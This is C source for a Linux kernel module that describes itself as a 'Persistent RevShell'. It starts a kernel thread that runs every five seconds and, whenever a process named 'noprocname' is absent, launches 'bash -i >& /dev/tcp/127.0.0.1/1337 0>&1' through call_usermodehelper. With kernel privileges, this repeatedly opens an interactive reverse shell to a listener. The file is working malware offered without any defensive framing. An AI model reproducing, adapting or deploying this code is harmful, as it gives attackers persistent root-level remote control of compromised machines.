#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/sched/signal.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");          
MODULE_AUTHOR("mtz");          
MODULE_DESCRIPTION("Persistent RevShell");

struct task_struct *mon_thread;
struct task_struct *task;

int mon_shell(void *data) { 
    while (!kthread_should_stop()) { 
        bool process_found = false; 
        
        for_each_process(task) {
            printk(KERN_INFO "Checking process: %s (PID: %d)\n", task->comm, task->pid);
            
            if (strncmp(task->comm, "noprocname", 10) == 0 && task->comm[10] == '\0') {
                process_found = true;
                printk(KERN_INFO "Process 'noprocname' found (PID: %d)\n", task->pid);
                break;
            }
        }
        
        if (!process_found) {
            call_usermodehelper("/bin/bash", 
                                (char *[]){"/bin/bash", "-c", "bash -i >& /dev/tcp/127.0.0.1/1337 0>&1", NULL}, 
                                NULL, UMH_WAIT_EXEC);

            printk(KERN_INFO "Executing reverse shell!\n");
        }
        
        ssleep(5);
    }
    return 0;
}

static int __init uninterruptible_sleep_init(void) {
    mon_thread = kthread_run(mon_shell, NULL, "matheuz");
    
    if (IS_ERR(mon_thread)) {
        printk(KERN_ALERT "Failed to create thread!\n");
        return PTR_ERR(mon_thread);
    }
    
    printk(KERN_INFO "Monitoring started!\n");
    return 0;
}

static void __exit uninterruptible_sleep_exit(void) {
    if (mon_thread) { 
        kthread_stop(mon_thread);
        printk(KERN_INFO "Monitoring stopped!\n");
    }
}

module_init(uninterruptible_sleep_init);
module_exit(uninterruptible_sleep_exit);
